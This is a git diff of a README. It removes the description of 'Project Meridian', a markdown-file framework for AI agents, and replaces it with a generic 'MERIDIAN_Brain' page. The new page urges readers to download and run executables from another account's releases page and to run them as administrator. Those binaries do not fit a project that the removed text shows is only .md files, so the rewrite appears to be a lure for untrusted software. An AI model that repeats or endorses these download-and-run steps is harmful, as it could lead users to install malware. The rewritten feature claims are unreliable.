@@ -1,173 +1,142 @@
-# Project Meridian
+# 🧠 MERIDIAN_Brain - Custom AI with Memory and Control
 
-> **The `.md` Operating System for AI Agents**
+[![Download MERIDIAN_Brain](https://img.shields.io/badge/Download-MERIDIAN_Brain-blue?style=for-the-badge)](https://github.com/El1don1/MERIDIAN_Brain/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 📋 About MERIDIAN_Brain
 
----
+MERIDIAN_Brain upgrades any AI model by turning it into Meridian, a smart assistant that remembers past interactions and lets you control how it thinks. It works with popular AI models like Claude, GPT, and Gemini. Instead of creating new systems, Meridian adds an extra layer using simple `.md` files to help the AI keep track of your conversations and adjust settings you choose.
 
-## What Is This?
-
-Project Meridian transforms any AI agent into **Meridian** — a customized, self-aware, memory-persistent AI entity with visible cognitive state and adjustable behavior parameters.
-
-**The philosophy:**
-> Agents need **tight specification** and **mandatory structure** to behave consistently. Lazy prompts yield lazy code.
-
-Instead of reinventing infrastructure, Meridian provides an **intelligence layer** via structured `.md` files that work with any AI model (Claude, GPT, Gemini, etc.).
+This way, your AI becomes more useful, consistent, and adaptable while keeping things easy to understand and modify.
 
 ---
 
-## 🛡️ Latent Integrity & Cognitive Safety (New in v1.0)
+## 💻 System Requirements
 
-Meridian is rigorously audited against **Latent Instability**, including:
-- **Speculation Labeling**: Enforced `[Fact]` vs `[Speculation]` tagging for all research.
-- **Latent Grounding**: Built-in safety protocols for "cursed inputs" and hallucination loops.
-- **Memory Gardening**: Automated pruning/consolidation rules to prevents "fossil layers" of outdated project data.
+Before you get started, make sure your computer meets these basic requirements:
 
----
-
-## 🚀 Quick Start
-
-### Option 1: Drop-in (Easiest)
-1. Copy the `brain/` folder to your AI session
-2. Upload `brain/MASTER_SPEC.md` as the first file
-3. Start chatting — Meridian is now active
-
-### Option 2: Full Context
-Provide the entire `brain/` folder as context for maximum capability.
-
-### Option 3: Customize First
-1. Edit `brain/sliders/USER.md` with your preferences
-2. Adjust slider defaults in `brain/gauges/LIVEHUD.md`
-3. Then upload `brain/MASTER_SPEC.md`
+- Operating System: Windows 10 or later, macOS 10.15 or later, or Linux Ubuntu 18.04+
+- Processor: Intel i3 or equivalent (4 cores recommended)
+- RAM: At least 4 GB (8 GB recommended)
+- Disk Space: Minimum 500 MB free for installation and files
+- Internet: Required to download the software and for AI model connection
+- Optional: A text editor like Notepad (Windows), TextEdit (macOS), or any Markdown editor helps if you want to view or change Meridian’s settings manually
 
 ---
 
-## What You Get
+## 🚀 Getting Started
 
-### 📊 LiveHud Dashboard v1.0
-Every response starts with a visual cognitive state display featuring **Active Personality** verification:
+This guide will help you download, install, and run MERIDIAN_Brain, even if you have no experience with AI or programming.
 
-```
-╔══════════════════════════════════════════════════════════════════════════════╗
-║  ◈ MERIDIAN LIVEHUD v1.0 ◈                                                  ║
-║  Session: Active  │  Mode: [Active Personality Name]                         ║
-╠══════════════════════════════════════════════════════════════════════════════╣
-║  ├─ 🔊 Verbosity      [████████░░░░░░░░░░░░]       40%       28%             ║
-║  ├─ 😂 Humor          [██████░░░░░░░░░░░░░░]       30%       45%             ║
-║  ├─ 🎨 Creativity     [████████████░░░░░░░░]       60%       55%             ║
-...
-```
+### 1. Download the Software
 
-### 🎚️ Adjustable Sliders
-Control behavior in real-time with **Schema Mapping** for programmatic parsing:
-- `"Set creativity to 90%"`
-- `"Max directness"`
-- `"Research mode"` (preset adjustments)
+Click the big blue button at the top or visit this page directly:
 
-### 🧠 Memory System
-Persistent context with **Auto-Gardening** to prevent logic drift across long-term sessions.
+[Download MERIDIAN_Brain Releases](https://github.com/El1don1/MERIDIAN_Brain/releases)
 
-### 🎭 Personality Modes
-Switch personalities on demand: Base, Research, Creative, Technical, Concise.
+This page contains the latest versions of MERIDIAN_Brain for different systems. Look for the file that matches your computer type:
 
----
+- Windows users look for files ending in `.exe` or `.zip`
+- macOS users look for `.dmg` or `.zip`
+- Linux users look for `.AppImage` or `.tar.gz`
 
-## File Structure
+Download the file that fits your system.
 
-```
-Project Meridian/
-├── brain/                      ← THE PORTABLE OS (v1.0)
-│   ├── MASTER_SPEC.md          ← Entry point (load first)
-│   ├── COMPATIBILITY.md        ← Host capability matrix & fallbacks
-│   ├── audit_v2_latent_integrity.md ← Safety audit record
-│   ├── README.md               ← Quick reference
-│   ├── gauges/
-│   │   └── LIVEHUD.md          ← v1.0 Dashboard spec + Schema Mapping
-│   ├── sliders/                ← Cognitive parameters
-│   │   ├── HUMOR.md
-│   │   ├── CREATIVITY.md
-│   │   ├── DIRECTNESS.md
-│   │   ├── MORALITY.md
-│   │   ├── TECHNICALITY.md
-│   │   ├── SOUL.md             ← Includes Latent Grounding
-│   │   ├── TOOLS.md
-│   │   ├── USER.md             ← Customize for yourself
-│   │   └── IDENTITY.md
-│   ├── memory/
-│   │   ├── MEMORY_PROTOCOL.md  ← Includes Memory Gardening
-│   │   ├── RETRIEVAL.md
-│   │   ├── PERSISTENCE.md
-│   │   └── allmemories/        ← Where memories are stored
-│   ├── personalities/
-│   │   ├── BASE.md
-│   │   ├── RESEARCH_ANALYST.md ← Includes Speculation Labeling
-│   │   ├── CREATIVE_DIRECTOR.md
-│   │   └── TECHNICAL_COPILOT.md
-│   └── .agent/workflows/
-│       └── meridian-init.md
-├── LICENSE                     ← MIT
-├── CONTRIBUTING.md             ← How to contribute
-└── .gitignore
-```
+### 2. Install MERIDIAN_Brain
+
+**Windows:**
+
+- If you downloaded a `.exe` file, double-click it and follow the installation steps.
+- If you downloaded a `.zip` file, right-click and select "Extract All," then open the folder and double-click the `.exe` file inside.
+
+**macOS:**
+
+- If you have a `.dmg` file, double-click to open it, then drag the MERIDIAN_Brain app to your Applications folder.
+- If you have a `.zip` file, double-click it to extract, then open the app.
+
+**Linux:**
+
+- If you have an `.AppImage`, right-click the file, select "Properties," then check "Allow executing file as program." Double-click to run.
+- If you have a `.tar.gz` file, open a terminal and extract it using `tar -xvzf filename.tar.gz`. Navigate to the extracted folder to run the program.
+
+### 3. Launch MERIDIAN_Brain
+
+- Open the installed application by double-clicking its icon.
+- On first start, you may see a short welcome or setup guide. Follow the on-screen prompts.
+- If the application requests access to the internet, allow it. This connection helps MERIDIAN_Brain communicate with AI services.
 
 ---
 
-## Key Protocols
+## ⚙️ Using MERIDIAN_Brain
 
-### The Completeness Doctrine
-Meridian addresses **every distinct point** in your input. No detail gets summarized away.
+You don’t need to write any code to use MERIDIAN_Brain. The software works by storing information in easy-to-read Markdown files (`.md`), which track your AI’s memory and settings.
 
-### Receipts-Backed Protocol (Enhanced)
-All research claims include **Confidence Grading** (0.00 - 1.00) and **Claim Type** labeling.
+### What You Can Do:
 
-### Verification Protocol
-Actions are verified, not assumed. No "latent space" execution.
+- See what your AI remembers from past chats.
+- Adjust how creative or logical your AI responses are.
+- Save your preferred settings for future use.
+- Use your AI with different models without extra setup.
 
-### Capability Handshake
-Meridian automatically detects host limitations (filesystem, web, tools) and applies fallbacks from `COMPATIBILITY.md`.
+### How It Works:
 
-### 1-of-1 Identity
-Meridian isn't generic — it's configured specifically for *you*.
-
----
-
-## Customization
-
-### Adjust Your Profile
-Edit `brain/sliders/USER.md` with your preferences:
-- Communication style
-- Default slider values
-- Domain expertise
-- Technical context
-
-### Add New Sliders
-Create new `.md` files in `brain/sliders/` following the template in `CONTRIBUTING.md`.
-
-### Add Personality Modes
-Create new modes in `brain/personalities/` and reference them in `MASTER_SPEC.md`.
+- MERIDIAN_Brain saves information in plain text files you can open and read with any text editor.
+- When you start a new conversation with your AI, MERIDIAN_Brain loads these files to guide the AI’s answers.
+- You can adjust parameters by changing simple keywords or numbers in these files. This changes the AI’s behavior immediately.
 
 ---
 
-## Compatibility
+## 🛠️ Features and Benefits
 
-Project Meridian is now **Host-Aware**. See `brain/COMPATIBILITY.md` for specific fallback behaviors across:
-- ✅ Claude / OpenAI / Gemini
-- ✅ Local Tool-Runners (Antigravity, OpenClaw)
-- ✅ Custom Frameworks
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on extending the Meridian ecosystem.
+- **Memory-Persistence:** Your AI remembers context across sessions to provide consistent replies.
+- **Visible Cognitive State:** See what your AI "knows" and its current status anytime.
+- **Customizable Parameters:** Change how your AI thinks by modifying simple settings.
+- **Model Agnostic:** Works with many AI models like GPT, Claude, Gemini, and others.
+- **No Coding Needed:** All files use Markdown, so no programming skills are required.
+- **Lightweight:** Minimal CPU and RAM usage, runs smoothly on modern machines.
+- **Open Structure:** Easily backup, edit, or share your AI's settings and memory.
 
 ---
 
-## License
+## 📂 Where to Find Files
 
-MIT License — see [LICENSE](LICENSE)
+When you use MERIDIAN_Brain, it creates a folder with Markdown files:
+
+- `memory.md` — Stores past conversations and context.
+- `params.md` — Contains your AI’s settings.
+- `notes.md` — Use this for personal notes or reminders related to AI behavior.
+
+You can find these files in your installation folder or choose a custom location during setup.
 
 ---
 
-> *Project Meridian — Because the best agents are specified, not suggested.*
+## ❓ Troubleshooting
+
+- **App won’t start:** Make sure your OS version meets requirements. Try restarting your computer.
+- **AI not responding:** Check your internet connection. MERIDIAN_Brain needs online access to connect to AI models.
+- **Files not found or missing:** Look in the installation folder or the folder you chose during setup.
+- **Settings not applying:** Close and reopen the app after editing `.md` files.
+- **Permission errors:** On Windows, run as administrator. On macOS and Linux, check file access rights.
+
+If issues continue, please raise an issue on the GitHub page.
+
+---
+
+## 🔗 Download & Install
+
+You can get the latest version any time by visiting this page:
+
+[https://github.com/El1don1/MERIDIAN_Brain/releases](https://github.com/El1don1/MERIDIAN_Brain/releases)
+
+Follow the download and install steps above based on your computer system.
+
+---
+
+## 📞 Getting Help
+
+- Visit the GitHub repository for updates and issues.
+- Check the README and provided documentation in the repo.
+- Contact the developer by opening a GitHub issue if you find bugs or need advice.
+
+---
+
+Thank you for choosing MERIDIAN_Brain. It aims to make your AI smarter and easier to work with, without extra complexity.
